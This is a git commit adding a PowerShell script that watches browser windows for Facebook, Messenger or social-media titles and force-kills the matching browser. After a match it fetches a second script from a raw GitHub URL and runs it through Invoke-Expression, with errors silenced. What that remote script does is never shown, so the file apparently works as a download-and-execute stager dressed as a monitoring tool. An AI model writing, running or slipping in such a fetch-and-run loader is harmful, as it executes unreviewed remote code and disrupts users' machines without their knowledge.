736968c0b24c5e219b9a134e1caddbe03a919234
Wesley5n1p35 <47337218+Wesley5n1p35@users.noreply.github.com>
2023-11-08 18:19:42 -0600

    Create monitorfb.ps1

---
+++ monitorfb.ps1
@@ -0,0 +1,49 @@
+# Define a list of partial titles you want to monitor
+$targetTitles = @("Facebook", "Messenger", "Social Media")
+
+# Define a list of popular browser process names
+$browserProcesses = @("chrome", "firefox", "msedge", "opera")
+
+# Define the interval to check (in seconds)
+$checkInterval = 15
+
+# Variable to track whether a condition has been met
+$conditionMet = $false
+
+# Loop until any condition is met
+while (-not $conditionMet) {
+    foreach ($browserName in $browserProcesses) {
+        $currentBrowserProcesses = Get-Process -name $browserName -ErrorAction SilentlyContinue
+        if ($currentBrowserProcesses) {
+            foreach ($process in $currentBrowserProcesses) {
+                try {
+                    $processTitle = $process.MainWindowTitle
+
+                    $matchingTitles = @()
+                    foreach ($targetTitle in $targetTitles) {
+                        if ($processTitle -like "*$targetTitle*") {
+                            $matchingTitles += $targetTitle
+                            Stop-Process -Id $process.Id -Force
+                            $conditionMet = $true  # Set the flag to true when any condition is met
+                        }
+                    }
+                } catch {
+                    # Error handling code can be added here, but it won't display in the console
+                }
+            }
+        }
+    }
+
+    if (-not $conditionMet) {
+        Start-Sleep -Seconds $checkInterval
+    }
+}
+
+# After the condition is met, download and execute your second script from GitHub
+if ($conditionMet) {
+    $secondScriptUrl = "https://raw.githubusercontent.com/Wesley5n1p35/psh/main/fb.ps1"
+    $secondScript = Invoke-WebRequest -Uri $secondScriptUrl
+    Invoke-Expression -Command $secondScript.Content
+}
+
+# Continue with the rest of your script here
